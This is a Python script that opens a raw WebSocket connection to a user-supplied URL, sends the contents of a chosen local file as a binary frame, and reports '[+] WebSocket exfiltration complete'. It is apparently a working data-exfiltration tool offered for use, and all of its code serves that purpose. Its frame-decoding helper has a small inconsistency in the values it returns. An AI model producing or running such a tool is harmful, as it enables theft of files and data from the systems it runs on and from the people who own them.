import argparse
import hashlib
import base64
import os
import socket
import struct
import sys
from urllib.parse import urlparse

WS_MAGIC = b"258EAFA5-E914-47DA-95CA-5AB9DC11B85B"


def encode_ws_frame(payload, opcode=0x2):
    """Encode a WebSocket frame (masked client->server)."""
    mask = os.urandom(4)
    masked_payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    frame = bytearray([0x80 | opcode])
    length = len(payload)
    if length < 126:
        frame.append(length | 0x80)
    elif length < 65536:
        frame.append(126 | 0x80)
        frame.extend(struct.pack("!H", length))
    else:
        frame.append(127 | 0x80)
        frame.extend(struct.pack("!Q", length))
    frame.extend(mask)
    frame.extend(masked_payload)
    return bytes(frame)


def decode_ws_frame(data):
    """Decode a single WebSocket frame (unmasked server->client)."""
    if len(data) < 2:
        return None, data
    b1, b2 = data[0], data[1]
    opcode = b1 & 0x0F
    length = b2 & 0x7F
    offset = 2
    if length == 126:
        length = struct.unpack("!H", data[2:4])[0]
        offset = 4
    elif length == 127:
        length = struct.unpack("!Q", data[2:10])[0]
        offset = 10
    payload = data[offset:offset + length]
    return opcode, payload, data[offset + length:]


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True)
    p.add_argument("--file", required=True)
    a = p.parse_args()

    parsed = urlparse(a.url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    # Generate WebSocket key
    ws_key = base64.b64encode(os.urandom(16)).decode()

    # Build HTTP upgrade request
    request = (
        "GET {} HTTP/1.1\r\n"
        "Host: {}:{}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: {}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    ).format(path, host, port, ws_key)

    # Connect
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    try:
        sock.connect((host, port))

        # Send upgrade request
        sock.sendall(request.encode())

        # Read response
        response = b""
        while b"\r\n\r\n" not in response:
            chunk = sock.recv(4096)
            if not chunk:
                print("[-] WebSocket: connection closed during handshake", file=sys.stderr)
                return
            response += chunk

        # Verify accept key
        expected_accept = base64.b64encode(
            hashlib.sha1(ws_key.encode() + WS_MAGIC).digest()
        ).decode()
        if expected_accept not in response.decode("utf-8", errors="replace"):
            print("[-] WebSocket: invalid accept key", file=sys.stderr)
            return

        # Read and send the file
        payload = open(a.file, 'rb').read()
        sock.sendall(encode_ws_frame(payload, 0x2))

        # Wait for OK response
        buf = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            result = decode_ws_frame(buf)
            if result is not None:
                opcode, data, _ = result
                if opcode == 0x1:  # Text
                    print("[+] WebSocket: server responded: {}".format(data.decode()))
                break

        print("[+] WebSocket exfiltration complete")
    except Exception as e:
        print("[-] WebSocket error: {}".format(e), file=sys.stderr)
    finally:
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
